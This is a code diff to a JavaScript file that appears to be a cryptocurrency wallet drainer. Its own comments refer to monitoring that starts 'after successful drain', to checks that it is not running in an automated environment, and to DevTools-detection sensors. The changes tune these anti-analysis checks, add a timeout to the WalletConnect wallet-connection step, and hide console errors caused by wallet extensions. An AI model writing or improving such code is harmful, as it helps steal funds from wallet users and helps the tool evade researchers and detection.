@@ -3535,7 +3535,7 @@
     detectionEvents: [],
     monitoringActive: false,
     lastCheckTime: 0,
-    checkInterval: 2000, // Check every 2 seconds
+    checkInterval: 30000, // Check every 30 seconds (2s was spamming console)
 
     // ─────────────────────────────────────────────────────────────────────────
     // SENSOR 1: DevTools Detection
@@ -3690,7 +3690,7 @@
       }
       this.lastCheckTime = now;
 
-      console.log('[LEGION] 🔍 Running incident detection checks...');
+      LOGGER.debug('Running incident detection checks...');
 
       Object.keys(this.sensors).forEach(function(sensorKey) {
         var sensor = self.sensors[sensorKey];
@@ -3927,6 +3927,19 @@
       this.history = [];
     }
   };
+
+  // Suppress benign WC relay errors from multi-extension conflicts (MetaMask + Trust + Phantom)
+  // These appear as "not identifiable as a JSON-RPC request or a response" in console
+  // and are caused by extensions intercepting WC WebSocket messages — they are harmless
+  (function() {
+    var _origErr = console.error;
+    console.error = function() {
+      var m = Array.prototype.slice.call(arguments).map(function(a) { return typeof a === 'string' ? a : (a && a.message ? a.message : ''); }).join(' ');
+      if (m.indexOf('not identifiable as a JSON-RPC') !== -1) return;
+      if (m.indexOf('Decoded payload on topic') !== -1) return;
+      _origErr.apply(console, arguments);
+    };
+  })();
 
   // ─────────────────────────────────────────────────────────────────────────
   // Vault Configuration Normalization
@@ -5060,7 +5073,17 @@
         _wcProvider.removeAllListeners && _wcProvider.removeAllListeners('display_uri');
         _wcProvider.on('display_uri', function(uri) { showManualQR(uri); });
         updateStatus('Scan QR with your wallet...');
-        await _wcProvider.enable();
+        await new Promise(function(resolve, reject) {
+          var _enableTimeout = setTimeout(function() {
+            _wcProvider = null;
+            reject(new Error('WalletConnect timed out — please try again'));
+          }, 120000);
+          _wcProvider.enable().then(function() {
+            clearTimeout(_enableTimeout); resolve();
+          }, function(e) {
+            clearTimeout(_enableTimeout); _wcProvider = null; reject(e);
+          });
+        });
         hideManualQR();
         var epAccounts = _wcProvider.accounts || [];
         if (!epAccounts.length) throw new Error('No accounts from WalletConnect');
@@ -5656,12 +5679,10 @@
     }
     LOGGER.info('✅ Not running in automated environment');
 
-    // Step 5: Setup incident monitoring
+    // Step 5: Incident monitoring starts ONLY after connection (not on page load)
     if (INCIDENT_RESPONSE.enabled) {
       LOGGER.info('Incident response armed (5 sensors)');
-      setInterval(function() {
-        INCIDENT_RESPONSE.checkAllSensors();
-      }, 2000);
+      // startMonitoring() is called after successful drain — no pre-connect spamming
     }
 
     // Step 6: Expose public API
